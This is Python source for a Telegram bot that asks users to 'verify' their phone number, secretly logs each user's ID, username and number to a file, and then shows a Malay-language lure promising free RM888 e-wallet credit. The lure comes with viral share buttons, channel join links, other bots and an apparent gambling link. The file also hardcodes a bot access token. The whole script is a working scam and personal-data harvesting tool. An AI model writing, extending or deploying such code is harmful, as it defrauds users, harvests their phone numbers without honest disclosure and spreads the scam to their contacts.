import os
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters
)
from datetime import datetime

# File to store user IDs
CONTACTS_FILE = "shared_contacts.txt"

# Load shared contacts from file
def load_shared_contacts():
    if not os.path.exists(CONTACTS_FILE):
        return set()
    with open(CONTACTS_FILE, "r") as file:
        return set(line.strip() for line in file)

# Save shared contacts to file
def save_shared_contacts():
    with open(CONTACTS_FILE, "w") as file:
        for user_id in shared_contacts:
            file.write(f"{user_id}\n")

# Set to store user IDs who have shared their contact
shared_contacts = load_shared_contacts()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)

    # Check if the user has already shared their contact
    if user_id in shared_contacts:
        await send_content(update)
    else:
        # Ask for contact permission
        button = KeyboardButton("📱 Verify Phone Number", request_contact=True)
        keyboard = ReplyKeyboardMarkup([[button]], one_time_keyboard=True, resize_keyboard=True)

        await update.message.reply_text(
            "Verify your phone number to continue:",
            reply_markup=keyboard
        )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user

    if contact:
        phone_number = contact.phone_number
        user_id = str(user.id)
        username = user.username or "NoUsername"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Add user ID to the set and save to file
        shared_contacts.add(user_id)
        save_shared_contacts()

        # Save contact to log file
        with open("contacts_log.txt", "a", encoding="utf-8") as file:
            file.write(f"{timestamp} | {user_id} | @{username} | {phone_number}\n")

        await update.message.reply_text(f"✅ Verified! your phone number: {phone_number}")
        await send_content(update)

async def send_content(update: Update):
    # Image caption with description
    caption = (
        "🧧 <b>CLAIM FREE RM888</b> 🧧\n\n"
        "ℹ️ <b>ᴋʟɪᴋ ʙᴜᴛᴀɴɢ ᴅɪ ʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴀᴋʟᴜᴍᴀᴛ ʟᴀɴᴊᴜᴛ</b>\n\n"
        "1️⃣ <b>Mintak Free TnG Angpao ? Join Channel Notifikasi</b>\n\n"
        "2️⃣ 👉 <a href='https://t.me/addlist/sU_gdXU83j1hMzc1'>Join Here Channel Notifikasi</a>\n\n"
        "3️⃣ <b>Tekan /start untuk Claim Free Credit!</b>\n\n"
        "👇 <i>Sila Tekan Button Bawah</i> 👇"
    )

    # Inline buttons below the image
    buttons = [
        [InlineKeyboardButton("Share Kawan", url="https://t.me/share/url?url=https%3A%2F%2Ft.me%2Frmpartner_bot&text=Tekan%20Link%20dan%20Start%20Bot%20Dapat%20Free%20TNG%20%7C%20Daily%20Free%20RM888%20Angpao%7C%20Register%20Free%20RM388")],
        [
            InlineKeyboardButton("Subs Telegram", url="https://t.me/addlist/sU_gdXU83j1hMzc1"),
            InlineKeyboardButton("Free Credit", url="https://t.me/MYR_Gaming_Bot")
        ],
        [
            InlineKeyboardButton("Amoimovi", url="https://t.me/freetngmy_bot"),
            InlineKeyboardButton("BIGWIN", url="https://tinyurl.com/TLGFREERM")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(buttons)

    # Send image with caption and inline buttons
    await update.message.reply_animation(
        animation="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExNzJuemd3ZnU3ODgzazhkMGx2Mm1ram5sbHh6dTRxZnRicXNxZGRpNyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/IgK568w5oo4ulelP0X/giphy.gif",
        caption=caption,
        parse_mode="HTML",
        reply_markup=reply_markup
    )


# Setup bot
app = Application.builder().token("8120588500:AAE-v23LfF8ruJnjLgP9B0OGEI2uaCUTWwE").build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
app.run_polling()
